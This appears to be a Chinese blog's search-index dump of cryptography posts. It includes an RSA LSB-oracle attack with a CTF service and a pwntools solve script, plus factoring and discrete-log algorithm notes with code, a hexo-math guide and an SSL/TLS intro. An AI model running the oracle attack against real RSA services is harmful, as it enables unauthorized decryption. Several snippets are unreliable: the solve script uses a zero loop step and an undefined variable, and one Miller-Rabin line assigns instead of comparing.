Attack","date":"2018-03-27T09:18:35.000Z","path":"2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/","text":"此攻击方式是从rsa-least-significant-bit-oracle-attack 看到的，刚好用于Backdoor CTF的一道密码学的题目！ 0x1 问题描述假如用户知道公钥中$N,e,c$，并且可以任意构造密文$c_1$，返回此密文解密后$p_1$的末尾某些比特位的性质（记为函数$f$），求原始明文信息！ 最简单的函数$f$ 是表示 $p_1$ 的奇偶性。 0x2 原理攻击者得到密文$C=P^e(mod\\ n)$ ，将其乘以$2^e(mod\\ N)$, 并作为密文发送出去，若返回$f(2P)$ 如果$f(2P)$ 返回的最后一位是0，那么$2P&lt;N$，即$P&lt;N/2$ 如果$f(2P)$ 返回的最后一位是1，那么$2P&gt;N$，即 $P&gt;N/2$ 接着我们来看看$2P$ 和 $4P$ 如果返回的是（偶，偶），那么有 $P&lt;N/4$ 如果返回的是（偶，奇），那么有$N/4&lt;P&lt;N/2$ 如果返回的是（偶，奇），那么有$N/2&lt;P&lt;3N/4$ 如果返回的是（奇，奇），那么有$3N/4&lt;P&lt;N$ 从这里基本上就可以找到规律了，如果我们循环下去，基本上就可以得到P所处在的空间。当次数不断叠加，最终所处在的空间将会十分的小，于是就可以解出对应的解！ 0x3 方法$P\\in[0,P]$ 也即$LB=0$， $UB=N$ 使用$log_2\\ N$ 次可以根据密文$C$ 求解出明文$P$ $C&#39;=(2^e\\ mod\\ N)*C$ 1234if (Oracle(C&apos;) == even) UB = (UB + LB)/2;else LB = (UB + LB)/2; 0x4 实例Backdoor CTF 2018 题目 BIT-LEAKER service.py 12345678910111213141516171819202122232425#!/usr/bin/python -ufrom Crypto.Util.number import *from Crypto.PublicKey import RSAimport random#from SECRET import flagflag = \"CTF&#123;this_is_my_test_flag&#125;\"m = bytes_to_long(flag)key = RSA.generate(1024)c = pow(m, key.e, key.n)print(\"Welcome to BACKDOORCTF17\\n\")print(\"PublicKey:\\n\")print(\"N = \" + str(key.n) + \"\\n\")print(\"e = \" + str(key.e) + \"\\n\")print(\"c = \" + str(c) + \"\\n\")while True: try: temp_c = int(raw_input(\"temp_c = \")) temp_m = pow(temp_c, key.d, key.n) except: break l = str(((temp_m&amp;5) * random.randint(1,10000))%(2*(random.randint(1,10000)))) print \"l = \"+l solve.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# -*- coding: utf-8 -*-#/usr/bin/env pythonfrom pwn import *import libnumimport Cryptoimport refrom binascii import hexlify,unhexlifyif len(sys.argv)&gt;1: p=remote(&quot;127.0.0.1&quot;,2334)else: p=remote(&apos;127.0.0.1&apos;,2333)#context.log_level = &apos;debug&apos;def oracle(c): l = [] for i in range(20): p.sendline(str(c)) s = p.recvuntil(&quot;temp_c&quot;) l.append(int(re.findall(&quot;l\\s*=\\s*([0-9]*)&quot;,s)[0])) flag0 = 0 flag2 = 0 for i in range(20): if l[i]%2 != 0: flag0 = 1 if l[i] &gt; 10000: flag2 = 1 return [flag2,flag0]def main(): ss = p.recvuntil(&quot;temp_c&quot;) N = int(re.findall(&quot;N\\s*=\\s*(\\d+)&quot;,ss)[0]) e = int(re.findall(&quot;e\\s*=\\s*(\\d+)&quot;,ss)[0]) c = int(re.findall(&quot;c\\s*=\\s*(\\d+)&quot;,ss)[0]) size = libnum.len_in_bits(N) print &quot;N=&quot;,N print &quot;e=&quot;,e print &quot;c=&quot;,c c = (pow(2,e,N)*c)%N LB = 0 UB = N i = 1 while LB!=UB: flag = oracle(c) print i,flag if flag[1]%2==0: UB = (LB+UB)/2 else: LB = (LB+UB)/2 c = (pow(2,e,N)*c)%N i += 1 print LB print UB for i in range(-128,128,0): LB += i if pow(LB,e,N)==C: print unhexlify(hex(LB)[2:-1]) exit(0)if __name__ == &apos;__main__&apos;: main() p.interactive() 这道题有个问题，就是远程比较慢，所以可能需要很长时间！ 另外就是算法的正确度不能保证，所以可能需要中途断开，多跑几次！ 还有就是这个算法因为都是整除运算，导致的最终结果可能有一定误差！","tags":[{"name":"rsa","slug":"rsa","permalink":"http://yoursite.com/tags/rsa/"}]},{"title":"hexo使用hexo-math插件支持MathJax","date":"2018-03-27T03:57:57.000Z","path":"2018/03/27/hexo使用hexo-math插件支持MathJax/","text":"MathJax是使用LaTeX方式输入数学公式的好工具。Hexo虽然可以直接使用mathjax，但是存在一些不方便之处。使用hexo-math这个插件可以大大方便使用。使用Hexo 3.2.0，主题NexT 5.0.1，hexo-math 3.0.0安装方式如下 在hexo安装目录下执行 1npm install hexo-math --save 然后编辑站点根目录下的_config.yml，添加 123456math: engine: &apos;mathjax&apos; # or &apos;katex&apos; mathjax: src: custom_mathjax_source config: # MathJax config 之后进入theme的目录，编辑主题的_config.yml，找到mathjax字段。NexT 5.0.1中默认mathjax是禁用，需要改成 12mathjax: enable: true 最后hexo g，就可以部署或者运行server查看效果了。 几个测试例子使用$的一行代码： 1Simple inline $a = b + c$. Simple inline $a=b+c$. 使用$$的多行代码： 1234$$\\frac&#123;\\partial u&#125;&#123;\\partial t&#125;= h^2 \\left( \\frac&#123;\\partial^2 u&#125;&#123;\\partial x^2&#125; +\\frac&#123;\\partial^2 u&#125;&#123;\\partial y^2&#125; +\\frac&#123;\\partial^2 u&#125;&#123;\\partial z^2&#125;\\right)$$ $$\\frac{\\partial u}{\\partial t}= h^2 \\left( \\frac{\\partial^2 u}{\\partial x^2} +\\frac{\\partial^2 u}{\\partial y^2} +\\frac{\\partial^2 u}{\\partial z^2}\\right)$$ 使用Tag的块貌似不能用！！！ 12这儿讲了一些细节：首先是不能直接用\\\\来当换行符，需要用\\newline另外编辑公式的时候，不要使用* &#123;% math %&#125; 双大括号 等容易发生冲突的符号 12345678$$\\left[ \\begin&#123;array&#125;&#123;cc|c&#125; 1&amp;2&amp;3\\newline 4&amp;5&amp;6 \\end&#123;array&#125;\\right] $$ $$\\left[ \\begin{array}{cc|c} 1&amp;2&amp;3\\newline 4&amp;5&amp;6 \\end{array}\\right]$$","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"},{"name":"math","slug":"math","permalink":"http://yoursite.com/tags/math/"}]},{"title":"常用于密码学中的算法","date":"2018-03-26T05:44:56.000Z","path":"2018/03/26/常用于密码学中的算法/","text":"0x0 前言最近做了不少密码学的题目，对于常见的RSA密钥攻击已经非常熟悉，但是对于比较特殊的密码学攻击手段，我却不甚清楚。下面主要讲解的是几种常见的算法。 0x1 baby step giant step算法baby step giant step算法常用于ACM竞赛中，该算法的目的是让$a^x=b(mod\\ p)$ 求解的速度更快，核心是利用hash表查询的速度较普通查询方式快，当然同样是用空间换时间的一种思想。大概的时间复杂度$O(\\sqrt{p}\\ )$ 设$m=\\lceil\\sqrt{p}\\ \\rceil$ 那么可以设$x=i*m-j$ 所以原式等价于 $a^{i*m-j}=b(mod\\ p) $ 也即 $(a^{m})^i=b*a^j$ 枚举$j$ (从0-m)，将$b*a^j$ 存入hash表中 枚举i(范围1-m)，从hash表中寻找第一个满足$(a^{m})^i=b*a^j$ 的解 此时$x=i*m-j$ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;map&gt;#include&lt;cmath&gt;using namespace std;typedef long long ll;map&lt;ll,int&gt;mp;ll p,a,b;ll n,m,now,ans,t;bool flag;ll fast_pow(ll x)&#123; ll sum = 1; ll aa = a; while (x&gt;0) &#123; if (x&amp;1) sum = (sum*aa)%p; x = x&gt;&gt;1; aa = (aa*aa)%p; &#125; return sum;&#125;int main()&#123; while(scanf(\"%lld%lld%lld\",&amp;p,&amp;a,&amp;b)!=EOF) &#123; if(a%p==0) &#123; printf(\"no solution\\n\"); continue; &#125; mp.clear(); m = ceil(sqrt(p)); flag = false ; now = b%p; //b*a^j 当j==0时 mp[now] = 0; for(int i=1;i&lt;=m;++i) &#123; now = (now*a)%p; mp[now] = i; &#125; t = fast_pow(m); now = 1; for(int i=1;i&lt;=m;++i) //枚举 (a^m)^i &#123; now = (now*t)%p; if(mp[now]) &#123; flag = true; ans = i*m-mp[now]; printf(\"%lld\\n\",(ans%p+p)%p); //printf(\"%lld\\n\",(ans%p+p)%p); break; &#125; &#125; if(!flag) printf(\"no solution\\n\"); &#125; return 0;&#125; 0x2 Pohlig-Hellman算法此算法应用于密码学中比bsgs算法更广，而且效果也更佳！（因为bsgs算法所能求解的p值不能太大，位数多了就不能在有限时间内跑完） 原理： 问题： 已知a,b,p,以及p-1的分解质因数，求x使得 $a^x=b(mod\\ p)$ 设 $p-1=p_1^{e_1}*p_2^{e_2}...p_k^{e_k}$ 若能有 $k$ 组可用的等式 $x=x_i\\ (mod\\ p_i^{e_i})$ ，就可以用中国剩余定理求解出 $x(mod\\ p-1)$ 2.1 求解$x_i$对于 $p_i$ ，设 $x_i=c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}$ ，则 $x=x_i+s*p_i^{e_i}$ 求解 $c_0$ ： $b^{(p-1)/p_i}=(a^x)^{(p-1)/p_i}\\ mod\\ p$ $=(a^{c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}+s*p_i^{e_i}})^{(p-1)/p_i} \\ mod\\ p$ $=(a ^{c_0})^{(p-1)/p_i}\\ mod\\ p$ 由于 $b^{(p-1)/p_i}$ 已知， 而 $c_0$ 取值范围只在$[0,p_i-1]$ ，因而在 $p_i$ 不是特别大的时候，完全是可解的。 有心的同学会发现，这个求解只需要在 $O(\\lceil \\sqrt{p_i} \\rceil)$ 时间内就可求解，使用的仍是大步小步的思想。 设 $m=\\lceil \\sqrt{p_i}\\ \\rceil $ ，$c_0 = u*m - v$ 则上式可表示为 $b^{(p-1)/p_i}*(a^{(p-1)/p_i})^v = (a^{m*(p-1)/p_i})^u$ 利用hash表可以快速求解出来！ 求解 $c_i $ : 基于上面的表达式，我们可以快速求解出$c_0$ 等值，然后求解$c_1$ ，依次求解，最终可以将所有解求出来。 组合： $x_i=c_0+c_1*p_i+c_2*p_i^2+...+c_{e_i-1}*p_i^{e_i-1}$ 2.2 中国剩余定理求解x2.3 范例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Let the prime p = 8101, and a generator of Z8101 be a = 6. Find x so thatax = 7531 mod 8101.Observe that p-1 = 8100 = (22)(34)(52), is a product of small primes. We shall determine the numbers x2 = x mod (22), x3 = x mod (34) and x5 = x mod (52).Determination of x2.Since x2 is a number mod 4, we have x2 = c0 + c1 (2), with the coefficients being either 0 or 1. We determine these coefficients as follows.7531(p-1)/2 = 75314050 = -1 and as this = ac0 (p-1)/2, we have c0 = 1.Now, divide 7531 by ac0 to get7531(a-1) = 7531(6751) = 8006 mod p.8006(p-1)/4 = 80062025 = 1 and as this = ac1 (p-1)/2, we have c1 = 0.x2 = c0 + c1 (2) = 1 + 0(2) = 1.Determination of x3.Since x3 is a number mod 81, we have x3 = c0 + c1 (3) + c2 (9) + c3 (27), with the coefficients being either 0, 1 or 2. It will be of use to know the numbers a(p-1)/3 = 5883, and a2(p-1)/3 = 2217.7531(p-1)/3 = 2217, so c0 = 2.Now divide 7531 by ac0 to get7531(a-2) = 6735 mod p.6735(p-1)/9 = 1, so c1 = 0.Now divide 6735 by a3c1 to get6735(a0) = 6735 mod p.6735(p-1)/27 = 2217, so c2 = 2.Now divide 6735 by a9c2 to get6735(a-18) = 6992 mod p.6992(p-1)/81 = 5883, so c3 = 1.x3 = 2 + 0(3) + 2(9) + 1(27) = 47.Determination of x5.Since x5 is a number mod 25, x5 = c0 + c1 (5), with the coefficients being either 0, 1, 2, 3 or 4. We need to compute a(p-1)/5 = 3547, a2(p-1)/5 = 356, a3(p-1)/5 = 7077, a4(p-1)/5 = 5221.7531(p-1)/5 = 5221, so c0 = 4.Divide 7531 by ac0 to get7531(a-4) = 7613 mod p.7613(p-1)/25 = 356, so c1 = 2.x5 = 4 + 2(5) = 14.Determination of x.We now use the Chinese Remainder Theorem to compute the common solution of the congruences,x = 1 mod 4x = 47 mod 81x = 14 mod 25.M1 = 8100/(4) = 2025 y1 = M1-1 mod 4, y1 = 1.M2 = 8100/81 = 100y2 = M2-1 mod 81, y2 = 64.M3 = 8100/25 = 324y3 = M3-1 mod 25, y3 = 24.x = 1(2025)(1) + 47(100)(64) + 14(324)(24) = 6689 mod 8100. 上文转载于 Pohlig-Hellman范例 0x3 Pollard’s rho算法Pollard’s rho算法是一种常用的因数分解算法，对于分解因子较小的组合数特别有用。对于一个正整数n，在一般情况下，我们主要使用的是枚举1到n^(1/2)来求n的因子，所以算法复杂度是O(n^(1/2))。但是实际上有更好的办法，那就是Pollard&#39;s Rho算法，这个算法是一个随机化的算法，简单的说不是完全靠谱，一般我们认为它的平均算法复杂度是O(n^(1/4))。 3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率我们随即地从[1,N]中选择一个数，这个数是 p 或者 q 的可能性是非常小的，所有我们不得不重复运行算法来提高概率。那么，我们现在可以提出一个不同的问题：不再只选取一个整数，我们能够选取 𝑘 个数，并问是否存在𝑥𝑖 − 𝑥𝑗能够整除N 当 $k=\\sqrt{N}$ 时，可能性跳高到了50% 策略： 在区间[𝟐, 𝑵 − 𝟏]中随即选取 𝒌 个数，𝒙𝟏, … … , 𝒙𝒌判断是否存在𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 , 𝑵) &gt; 𝟏, 若存在，𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 ,𝑵) 是𝑵的一个因子 ( 𝒑 或 𝒒 ) 但是很早就出现了一个问题，我们需要选取大约 𝑁^1/4 个数，这个数量太大了，以至于我们并不能将其存放在内存中 3.2 Pollard‘s rho算法详解为了解决数太多无法存储的问题，Pollard′s rho algorithm 只将两个数存放在内存中。 我们并不随机生成 k 个数并两两进行比较，而是一个一个地生成并检查连续的两个数。反复执行这个步骤并希望能够得到我们想要的数。我们使用一个函数来生成伪随机数。换句话说，我们不断地使用函数 𝑓 来生成（看上去或者说感觉上像的）随机数。并不是所有的函都能够这样做，但是有一个神奇的函数可以。它就是 $𝑓(𝑥) = ( 𝑥^2 + 𝑎 ) mod 𝑁$ 你可以发现对于大部分的数据这个算法能够正常运行，但是对于某些数据，它将会进入无限循环。为什么呢？这是因为存在 𝑓 环的原因。当它发生的时候，我们会在一个有限数集中进行无限循环。 例如，我们可以构造一个伪随机函数并生成如下伪随机数： 12, 10, 16, 23, 29, 13, 16, 23, 29, 13 … … 在这个例子中，我们最终将会在16, 23, 29, 13这个圈中无限循环，永远找不到因子。 那么，如何探测环的出现呢？ 一种方法是记录当前产生过的所有的数𝑥1, 𝑥2, … … 𝑥𝑛,并检测是否存在𝑥𝑙 = 𝑥𝑛(𝑙 &lt; 𝑛)。在实际过程中，当 𝑛 增长到一定大小时，可能会造成的内存不够用的情况。 另一种方法是由Floyd发明的一个算法，我们举例来说明这个聪明而又有趣的算法。假设我们在一个很长很长的圆形轨道上行走，我们如何知道我们已经走完了一圈呢？当然，我们可以像第一种方法那样做，但是更聪明的方法是让 A 和 B 按照 B 的速度是A 的速度的两倍从同一起点开始往前走，当 B 第一次敢上 A 时(也就是我们常说的套圈)，我们便知道，B 已经走了至少一圈了。 3.3 算法实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;algorithm&gt; #include &lt;cmath&gt; #include &lt;cstring&gt; #include &lt;map&gt; using namespace std;const int times = 50;int number = 0;map&lt;long long, int&gt;m;long long Random( long long n )&#123; return ((double)rand( ) / RAND_MAX*n + 0.5);&#125;long long q_mul( long long a, long long b, long long mod ) //快速乘法取模&#123; long long ans = 0; while(b) &#123; if(b &amp; 1) &#123; ans += a; &#125; b /= 2; a = (a + a) % mod; &#125; return ans;&#125;long long q_pow( long long a, long long b, long long mod ) //快速乘法下的快速幂，叼&#123; long long ans = 1; while(b) &#123; if(b &amp; 1) &#123; ans = q_mul( ans, a, mod ); &#125; b /= 2; a = q_mul( a, a, mod ); &#125; return ans;&#125;bool witness( long long a, long long n )//miller_rabin算法的精华&#123; long long tem = n - 1; int j = 0; while(tem % 2 == 0) &#123; tem /= 2; j++; &#125; long long x = q_pow( a, tem, n ); //得到a^(n-1) mod n if(x == 1 || x == n - 1) return true; while(j--) &#123; x = q_mul( x, x, n ); if(x = n - 1) return true; &#125; return false;&#125;bool miller_rabin( long long n ) //检验n是否是素数&#123; if(n == 2) return true; if(n &lt; 2 || n % 2 == 0) return false; for(int i = 1; i &lt;= times; i++) //做times次随机检验 &#123; long long a = Random( n - 2 ) + 1; //得到随机检验算子 a if(!witness( a, n )) //用a检验n是否是素数 return false; &#125; return true;&#125;long long gcd( long long a, long long b )&#123; if(b == 0) return a; return gcd( b, a%b );&#125;long long pollard_rho( long long n, long long c )//找到n的一个因子&#123; long long x, y, d, i = 1, k = 2; x = Random( n - 1 ) + 1; y = x; while(1) &#123; i++; x = (q_mul( x, x, n ) + c) % n; d = gcd( y - x, n ); if(1&lt;d&amp;&amp;d&lt;n) return d; if(y == x)//找到循环，选取失败，重新来 return n; if(i == k) //似乎是一个优化，但是不是很清楚 &#123; y = x; k &lt;&lt;= 1; &#125; &#125;&#125;void find( long long n, long long c )&#123; if(n == 1) return; if(miller_rabin( n )) &#123; m[n]++; number++; return; &#125; long long p = n; while(p &gt;= n) p = pollard_rho( p, c-- ); find( p, c ); find( n / p, c );&#125;int main( )&#123; long long tar; while(cin &gt;&gt; tar) &#123; number = 0; m.clear(); find( tar, 2137342 ); printf( \"%lld = \", tar ); if(m.empty()) &#123; printf( \"%lld\\n\", tar ); &#125; for(map&lt;long long, int&gt;::iterator c = m.begin(); c != m.end();) &#123; printf( \"%lld^%d\", c-&gt;first, c-&gt;second ); if((++c) != m.end()) printf( \" * \" ); &#125; printf( \"\\n\" ); &#125; return 0;&#125; 0x4 Pollard&#39;s p-1 算法4.1 smooth与powersmooth如果一个整数的所有素因子都不大于B，我们称这个整数是B-Smooth数 如果一个整数的所有素因子的对应指数次幂不大于B，我们称这个整数是B-powersmooth数 $720({2^4}{3^2}{5^1})$ 是一个5-smooth数，6-smooth数，7-smooth数 但5^1\\&lt;3^2\\&lt;2^4=16，所以它也是一个16-powersmooth数 4.2 原理解释n 是一个合数，其中一个质数位p，由费马小定理有：$a^{K(p-1)}=1(mod\\ p)$ 如果 $x=1(mod\\ p)$ ，就有 $p|gcd(x-1,n)$ 这个算法的思想就是构造p-1，其有多个素因子，并且每个素因子的powersmooth不超过B，开始时随机选取一个x， 计算 $x^w\\ mod\\ n$ , $w=\\prod_{primes\\ q\\leq\\ B}\\ q^{\\lfloor \\log_{q}{B}\\rfloor}$ ， 如果有$gcd(x^w, n)$ 不等于1， 那么我们就相当于找到一个素数p了 4.3 算法Inputs: n: a composite numberOutput: a nontrivial factor of n or failure select a smoothness bound B define $M=\\prod_{primes\\ q\\leq\\ B}\\ q^{\\lfloor \\log_{q}{B}\\rfloor}$ (note: explicitly evaluating M may not be necessary) randomly pick a coprime to n (note: we can actually fix a, e.g. if n is odd, then we can always select a = 2, random selection here is not imperative) compute $g = gcd(a^M − 1, n)$ (note: exponentiation can be done modulo n) if 1 &lt; g &lt; n then return g if g = 1 then select a larger B and go to step 2 or return failure if g = n then select a smaller B and go to step 2 or return failure 这里的larger B和smaller B有选择性的方法，具体是啥我也不太清楚！ 4.4 范例If we want to factor the number n = 299. We select B = 5. Thus $M = 2^2 × 3^1 × 5^1$. We select a = 2. $g = gcd(a^M − 1, n) = 13$. Since 1 &lt; 13 &lt; 299, thus return 13. 299 / 13 = 23 is prime, thus it is fully factored: 299 = 13 × 23. 0x5 Williams&#39;s p + 1 算法Pollard&#39;s p-1算法比较容易懂，但是Williams’s p+1算法却不怎么让人明白！ 5.1 算法选择大于2的整数A，用其生成一个卢卡斯序列： $V_0=2, V_1=A,V_j=AV_{j-1}-V_{j-2}$ 0xn smooth质数n.1 p - 1 光滑当 p 是 N 的因数，并且 p - 1 是光滑的时候，可能可以使用 Pollard&#39;s p − 1 算法来分解 N，但是也不是完全可以成功的。 n.2 p + 1 光滑当 p 是 n 的因数，并且 p + 1 是光滑的时候，可能可以使用 Williams&#39;s p + 1 算法来分解 N，但是也不是完全可以成功的。 n.3 primefac包上面的两种光滑，都可以使用包primefac 来做 primefac是一个贼好用的工具，环境一般在linux上，cygwin上也能用，运行速度贼快！ 不能在windows上使用的原因 在Windows中，多进程multiprocessing使用的是序列化pickle来在多进程之间转移数据，而socket对象是不能被序列化的，但是在linux操作系统上却没问题，因为在linux上多进程multiprocessing使用的是fork，所以在windows上可以改用多线程。 常用的命令行使用方式： 12python -m primefac [-vs] [-v|--verbose] [-s|--summary] [-t=NUM] [-r=NUM] [-m=[prb][,p-1][,p+1][,ecm][,mpqs]] rpn 12345678910111213141516 rpn is an expression in revese Polish notation and is evaluated using integer arithmetic. Each number that remains on the stack after evaluation is then factored.-t sets the trial division limit; the default value is 1000. Use -t=inf to use trial division exclusively.-r sets the number of rounds of Pollard’s rho algorithm to try before calling a factor “difficult”. The default value is 42,000. Use -r=inf to use Pollard’s rho exclusively once the trial division is completed.If verbosity is invoked, we indicate in the output which algorithm produced which factors during the multifactor phase.If the -s (or --summary) flag is absent, then output is identical to the output of the GNU factor command, except possibly for the order of the factors and, if verbosity has been turned on, the annotations indicating which algorithm produced which factors.If the -s (or --summary) flag is present, then output is modified by adding a single newline between each item’s output, before the first item, and after the last item. Each item’s output is also modified by printing a second line of data summarizing the results by describing the number of decimal digits in the input, the number of decimal digits in each prime factor, and the factors’ multiplicitiesThe -v and -s flags may be combined into a single flag in either order — i.e., into -vs or -sv.The -m= flag controls the functions used during the multifactor phase. The options are prb, p-1, p+1, ecm, and mpqs, representing Pollard’s rho, Pollard’s p-1, Williams’ p+1, the elliptic curve method, and the multiple polynomial quadratic sieve, respectively. The options must be separated by commas. The options can be repeated: if prb is listed twice, for example, then multifactor will run two instances of pollardRho_brent simultaneously. In the case of prb and ecm, this decreases the expectation value of the time to find a factor, whereas the other three algorithms (p-1, p+1, and MPQS) have no randomized component so that running duplicate instances of these three algorithms confers no benefit. We therefore ignore repeated listings of the latter three methods: for example, calling 1python -m primefac -m=prb,prb,ecm,ecm,ecm,mpqs,mpqs 38 ! 1 + 从上面的说明中可以看出，primefac可以使用多种常用的分解质因数的方法，而rpn时使用逆波兰表示法表示的数。 n.4 整数分解的方法 Trial division Wheel factorization Pollard&#39;s rho algorithm Algebraic-group factorisation algorithms, among which are Pollard&#39;s p − 1 algorithm, Williams&#39; p + 1 algorithm, and Lenstra elliptic curve factorization Fermat&#39;s factorization method Euler&#39;s factorization method Special number field sieve 0xn+1 ctf中范例n+1.1 2017 SECCON very smooth将题目从文件中binwalk出来之后，发现了一个证书，给出了大整数n 1234python -m primefac -vs -m=p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 至于这里为什么只能用Williams&#39;s p + 1 算法而不能用 Pollard&#39;s p − 1 算法分解，其原因可能如下： 123456789➜ python -m primefac -vs 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000021180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823➜ python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5Z154 = P1^185 x P1^62 x P1^97 = 2^185 x 3^62 x 5^97 其实从此处看出，对于 p-1 确实有很多小因子，但是个数太多，这就会使得进行枚举的时候出现指数爆炸的情况，因此没有分解出来。 n+1.2 2018 Backdoor Awesome-mix2这道题是一道验证题，但是需要解决一个问题： 已知s，m，（都是不超过1024位的大整数），求使得 $s^e=m(mod n)$ 的 e和n，约束条件是: $e&gt;=3, n&gt;=s, n.bit_length &lt;= 1025$","tags":[{"name":"rsa","slug":"rsa","permalink":"http://yoursite.com/tags/rsa/"}]},{"title":"深度解读SSL/TLS实现","date":"2018-03-20T15:01:20.000Z","path":"2018/03/20/深度解读SSL-TLS实现/","text":"一 前言SSL/TLS协议是网络安全通信的重要基石，本系列将简单介绍SSL/TLS协议，主要关注SSL/TLS协议的安全性，特别是SSL规范的正确实现。 本系列的文章大体分为3个部分： SSL/TLS协议的基本流程 典型的针对SSL/TLS协议的攻击 SSL/TLS协议的安全加固措施 本文对SSL/TLS协议概况做基本介绍，包括SSL/TLS协议的版本变迁，协议的详细流程以及流行的SSL/TLS协议实现。文章的主要内容翻译自波鸿鲁尔大学Christopher Meyer的文章《20 Years of SSL/TLS Research An Analysis of the Internet’s Security Foundation》，同时也根据作者自己的理解增加了部分内容，以使对SSL/TLS协议的介绍更为完整。 二 什么是SSL/TLS?SSL全称是Secure Sockets Layer，安全套接字层，它是由网景公司(Netscape)设计的主要用于Web的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL已经成为互联网保密通信的工业标准。 SSL最初的几个版本(SSL 1.0、SSL2.0、SSL 3.0)由网景公司设计和维护，从3.1版本开始，SSL协议由因特网工程任务小组(IETF)正式接管，并更名为TLS(Transport Layer Security)，发展至今已有TLS 1.0、TLS1.1、TLS1.2这几个版本。 如TLS名字所说，SSL/TLS协议仅保障传输层安全。同时，由于协议自身特性(数字证书机制)，SSL/TLS不能被用于保护多跳(multi-hop)端到端通信，而只能保护点到点通信。 SSL/TLS协议能够提供的安全目标主要包括如下几个： 认证性——借助数字证书认证服务器端和客户端身份，防止身份伪造 机密性——借助加密防止第三方窃听 完整性——借助消息认证码(MAC)保障数据完整性，防止消息篡改 重放保护——通过使用隐式序列号防止重放攻击 为了实现这些安全目标，SSL/TLS协议被设计为一个两阶段协议，分为握手阶段和应用阶段： 握手阶段也称协商阶段，在这一阶段，客户端和服务器端会认证对方身份(依赖于PKI体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及MasterSecret。后续通信使用的所有密钥都是通过MasterSecret生成。 在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。 SSL/TLS协议有一个高度模块化的架构，分为很多子协议，如下图所示： Handshake协议：包括协商安全参数和密码套件、服务器身份认证(客户端身份认证可选)、密钥交换; ChangeCipherSpec 协议：一条消息表明握手协议已经完成; Alert 协议：对握手协议中一些异常的错误提醒，分为fatal和warning两个级别，fatal类型的错误会直接中断SSL链接，而warning级别的错误SSL链接仍可继续，只是会给出错误警告; Record 协议：包括对消息的分段、压缩、消息认证和完整性保护、加密等。 三 协议流程详解本节对SSL/TLS协议的流程进行详细介绍。一个典型的TLS 1.0协议交互流程如下图所示： 每一个SSL/TLS链接都是从握手开始的，握手过程包含一个消息序列，用以协商安全参数、密码套件，进行身份认证以及密钥交换。握手过程中的消息必须严格按照预先定义的顺序发生，否则就会带来潜在的安全威胁。今年顶级安全会议CCS 